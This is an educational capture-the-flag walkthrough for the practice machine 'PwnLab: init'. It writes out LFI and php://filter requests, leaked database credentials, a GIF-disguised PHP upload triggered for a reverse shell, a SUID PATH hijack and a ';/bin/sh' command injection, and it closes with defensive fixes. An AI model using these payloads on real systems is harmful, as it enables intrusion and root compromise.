# Machine 10 — PwnLab: init

> **Position:** 10 of 13 · **Band 3 — Easy** (global rank **057** of 708)
> **Full writeup:** [`labs/3-057-pwnlab-init/README.md`](../../labs/3-057-pwnlab-init/README.md)

| | |
| --- | --- |
| **Machine** | PwnLab: init |
| **Author** | Claor |
| **Released** | 1 August 2016 |
| **Target** | Debian — Apache/PHP, **MySQL exposed on 3306**, `rpcbind` on 111 |
| **VulnHub** | [entry/pwnlab-init,158](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

This is the path's **Local File Inclusion** machine, and it teaches LFI properly —
three distinct ways, in one box:

1. **GET parameter:** `index.php?page=` reaches an `include()` with no validation.
2. **`php://filter`:** the wrapper that returns a PHP file's **source code** instead
   of its rendered output. This is how you read `config.php` and get the database
   password — the single most useful LFI technique in existence.
3. **Cookie:** a *second*, independent inclusion point via a `lang` cookie, with no
   `.php` suffix appended — which is what makes it able to include your uploaded
   image and therefore *execute* it.

Then the escalation is a **two-stage SUID chain**: a SUID binary that calls `cat`
**without an absolute path** (PATH hijack → become `mike`), followed by a
SUID-root helper that concatenates your input into a shell command (command
injection → become root). Two of the most important primitives in Linux privilege
escalation, back to back.

## Learning objectives

1. Detect **LFI** and confirm it by reading `/etc/passwd`.
2. Use **`php://filter/convert.base64-encode/resource=`** to disclose PHP source, and
   understand *why* it works.
3. Read a leaked `config.php` and use its **MySQL root credentials**.
4. Query a **remotely exposed MySQL** server and dump a users table.
5. Recognise **base64-encoded passwords** stored where hashes should be.
6. Read an upload form's **own source code** via LFI to learn exactly what it checks.
7. Bypass an image-only filter with a **GIF magic header** and understand the role of
   `getimagesize()`.
8. Trigger execution of the uploaded "image" through the **cookie** inclusion point.
9. Perform a **PATH hijack against a SUID binary**.
10. Perform **command injection in a SUID-root helper**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **LFI via GET parameter** | `index.php?page=…` → `include($_GET['page'].".php")` |
| **Source disclosure** | `?page=php://filter/convert.base64-encode/resource=config` |
| Secrets in a config file | `config.php` → `root : H4u%QJ_H99`, database `Users` |
| **Exposed database** | MySQL on **TCP 3306**, accepts remote root logins |
| **Passwords base64-encoded, not hashed** | `Users.users` → `kent`, `mike`, `kane` |
| **LFI via cookie** | `include("lang/".$_COOKIE['lang'])` — no `.php` appended |
| **Upload filter bypass** | `upload.php` image-only → GIF magic header inside a `.gif` |
| Reverse shell | from the included "image" |
| Credential reuse | DB passwords → local accounts (`kent`, `kane`) |
| **SUID + PATH hijack** | `/home/kane/msgmike` (SUID `mike`) calls `cat` with no absolute path |
| **SUID + command injection** | `/home/mike/msg2root` (SUID root) → `/bin/echo %s >> /root/messages.txt` |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI and the `php://filter`
  wrapper, plus the RCE-primitives table) and **§6** (file upload).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§6**
  (databases — including the `localhost` vs `127.0.0.1` distinction).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID)
  and **§7** (`PATH` hijacking) — both are required here.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 and §5.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1.

## Before you start — answer these

1. What is the difference between **LFI** and **RFI**, and which one is more dangerous?
2. Why does including a `.php` file normally *not* show you its source — and what does
   `php://filter` change about that?
3. A file starts with `GIF89a` and then contains PHP. Why would `getimagesize()`
   accept it, and why would PHP still execute it?
4. `strings` on a SUID binary shows `cat /home/mike/msg.txt`. What is wrong with that
   line?
5. `/bin/echo %s >> /root/messages.txt` with your input substituted for `%s`. What can
   you type to get a shell?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **80**, **111** and **3306**. Note that 3306 answers from your machine — that
is unusual and worth revisiting later.

The web app has a `?page=` parameter. Try making it read something it should not:

```bash
curl "http://TARGET/?page=../../../../etc/passwd"
```

If that works, you have LFI. Now think about what files on this server would be
*valuable* to read — and what you cannot read because PHP executes them before you
see them. There is a wrapper for exactly that.
</details>

<details>
<summary><strong>Rung 2 — reading source code</strong></summary>

```bash
curl "http://TARGET/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
```

(The wrapper sits in front, so the `.php` the application appends is harmless.)

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

**MySQL root credentials.** Port 3306 is reachable, so use them remotely:

```bash
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e 'SELECT * FROM users;'
```

The password column holds **base64**, not hashes:

```bash
echo "Sld6WHVCSkpOeQ==" | base64 -d   # kent  -> JWzXuBJJNy
echo "U0lmZHNURW42SQ==" | base64 -d   # mike  -> SIfdsTEn6I
echo "aVN2NVltMkdSbw==" | base64 -d   # kane  -> iSv5Ym2GRo
```

Do the same `php://filter` trick on `resource=login` and `resource=upload` to read
**the upload form's own validation code**.
</details>

<details>
<summary><strong>Rung 3 — the upload</strong></summary>

Log into the web app (`?page=login`) with one of the decoded credentials to reach the
upload form. From the source you just read, you know it checks that the file is an
**image** (via `getimagesize()` / MIME) and enforces an image extension.

So build a file that is *both*:

```bash
{ echo -n 'GIF89a'; cat shell.php; } > shell.gif
```

`getimagesize()` sees the `GIF89a` signature and reports `image/gif`; the extension
passes the allow-list. PHP ignores the GIF header and executes the PHP after it —
**if the file is included as PHP.**

Upload it. Note the stored filename (it is derived from the upload, e.g. an MD5).
</details>

<details>
<summary><strong>Rung 4 — executing it, then escalating</strong></summary>

The GET-parameter inclusion appends `.php`, so it cannot include your `.gif`. The
**cookie** inclusion does not:

```bash
curl -b "lang=../upload/<stored-name>.gif" http://TARGET/index.php
```

With `nc -lvnp 4444` listening and your shell's `$ip`/`$port` set, that gives you a
reverse shell as `www-data`.

**Escalation, stage 1 — PATH hijack:**

```bash
su - kane            # iSv5Ym2GRo   (kent's password works for kent, but is uninteresting)
ls -la /home/kane    # -rwsr-sr-x 1 mike mike 5148 msgmike
strings /home/kane/msgmike   # -> "cat /home/mike/msg.txt"  -- 'cat' has NO absolute path
```

```bash
cd /home/kane
printf '#!/bin/bash\n/bin/bash -p\n' > cat && chmod +x cat
export PATH=/home/kane:$PATH
./msgmike            # -> shell as mike
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # restore!
```

**Stage 2 — command injection in a SUID-root helper:**

```bash
cd /home/mike && strings msg2root     # -> /bin/echo %s >> /root/messages.txt
./msg2root
# at "Message for root:" type exactly:   ;/bin/sh
id     # uid=0(root)
cat /root/flag.txt
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **80** (Apache/PHP), **111** (`rpcbind`), **3306**
   (**MySQL**, reachable remotely).
2. **LFI** at `index.php?page=` → confirm with `/etc/passwd`.
3. **`php://filter/convert.base64-encode/resource=config`** → `config.php` source →
   **`root : H4u%QJ_H99`**, database **`Users`**.
4. Remote MySQL dump of `Users.users` → passwords stored as **base64** →
   `kent:JWzXuBJJNy`, `mike:SIfdsTEn6I`, `kane:iSv5Ym2GRo`.
5. Read `upload.php`'s source with the same wrapper → learn it is image-only.
6. Upload **`shell.gif`** = `GIF89a` + a PHP reverse shell → passes `getimagesize()`
   and the extension allow-list.
7. Execute it through the **cookie** inclusion:
   `curl -b "lang=../upload/<name>.gif" http://TARGET/index.php` → **`www-data`**.
8. `su kane` → **SUID `msgmike`** calls `cat` with no absolute path → **PATH hijack**
   → `mike`.
9. **SUID-root `msg2root`** builds `/bin/echo <input> >> /root/messages.txt` →
   answer the prompt with **`;/bin/sh`** → **root** → `/root/flag.txt`.
</details>

## After you finish — review questions

1. Why could the GET-parameter inclusion *not* execute your uploaded `.gif`, while
   the cookie inclusion could? Answer in terms of the string the application appends.
2. `php://filter` gave you source code. Name three other real-world files you would
   try to read with it, and what each would give you.
3. The database was reachable on TCP 3306 from your attack host. Independent of the
   leaked credentials, why is that a finding?
4. Passwords were stored as base64, not hashed. Is that better or worse than plain
   text? Explain why the answer is "the same".
5. `strings` on `msgmike` was enough to find the vulnerability. Why does `strings`
   work on a compiled binary, and what else should you always check with it?
6. You had to **restore `PATH`** after the hijack. What breaks if you do not?
7. `msg2root` used `/bin/echo` with an absolute path but still fell to injection.
   What is the difference between *hardening the command it calls* and *sanitising the
   input it passes*?
8. Which of these bugs is a **framework misuse** and which is a **developer error**?
   Why does the distinction matter when you write the fix?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| `include($_GET['page'].".php")` | **Never build an include path from user input.** Use an allow-list of keys mapped to fixed filenames |
| `include("lang/".$_COOKIE['lang'])` | Same. Cookies are user input — treat them exactly like GET/POST |
| PHP stream wrappers reachable | `allow_url_include = Off`; disable dangerous wrappers; consider `disable_functions` for `include` of remote paths |
| `config.php` with root DB credentials | Use a least-privilege DB account, never root. Keep credentials out of the web root where possible |
| **MySQL exposed on 3306 to the network** | `bind-address = 127.0.0.1`; firewall the port; never grant remote root |
| Passwords base64-encoded, not hashed | Hash with bcrypt/argon2 + per-user salt. Base64 is an *encoding*, not storage |
| Image-only upload validation via `getimagesize()` | `getimagesize()` validates the **header**, not the content. Also: store uploads outside the document root, re-encode images (which strips appended data), and never include user-controlled paths |
| Uploads inside the web root | Move them; set `php_admin_flag engine off` for that directory |
| **SUID `msgmike` calling `cat` without a path** | Use absolute paths in every privileged program; better, use `execve` with a fixed argv and no shell. Remove SUID if it is not needed |
| **SUID-root `msg2root` concatenating input into a shell command** | Never pass user input to a shell. Use `write()`/`fputs()` directly. This is command injection with root privileges |
| Credential reuse DB → local accounts | Unique credentials per system |

**The single biggest lesson:** *the same root cause appears three times on this box* —
untrusted input reaching a sink it should never reach (`include`, a shell command, a
`PATH` lookup). Learn to name the sink, and you will find these bugs by inspection
rather than by luck.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 9 — CengBox: 1](09-cengbox-1.md) · next: [Machine 11 — Photographer: 1](11-photographer-1.md) · full writeup: [`labs/3-057-pwnlab-init`](../../labs/3-057-pwnlab-init/README.md)._
